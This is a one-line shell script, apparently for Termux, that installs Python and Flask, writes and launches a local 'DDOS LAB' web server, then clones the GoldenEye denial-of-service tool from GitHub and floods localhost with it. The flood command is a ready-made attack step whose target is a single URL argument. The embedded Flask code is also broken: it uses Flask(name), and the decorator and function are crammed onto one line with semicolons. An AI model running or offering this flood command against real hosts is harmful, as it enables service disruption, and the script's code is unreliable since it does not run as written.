pkg update -y && pkg upgrade -y && pkg install python git -y && pip install flask requests && mkdir -p ~/ddoslab && cd ~/ddoslab && echo "from flask import Flask; import time; app = Flask(name); @app.route('/')\ndef home(): return f'DDOS LAB: Server Time = {time.ctime()}'; app.run(host='0.0.0.0', port=8080)" > server.py && nohup python server.py > server.log 2>&1 & cd ~ && git clone https://github.com/jseidl/GoldenEye.git && cd GoldenEye && python3 goldeneye.py http://127.0.0.1:8080 -w 100 -s 300 -d 1 --debug
